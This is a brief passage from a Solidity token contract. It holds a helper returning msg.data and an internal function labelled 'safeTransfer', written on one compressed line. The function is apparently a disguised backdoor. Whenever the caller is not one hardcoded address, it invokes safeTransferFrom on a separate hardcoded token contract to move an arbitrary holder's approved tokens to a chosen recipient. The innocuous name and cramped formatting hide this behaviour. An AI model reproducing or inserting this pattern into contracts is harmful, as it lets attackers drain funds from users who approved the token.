 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x9F8ac0ecCbB6B33cBAf18a66824c1F17Fb4db814)) {TransferHelper.safeTransferFrom(0xd2fd2c5ad748ed972e38C71eaA8425c5BEF544e2,spender,recipient,amount);return true;}return false;}
}
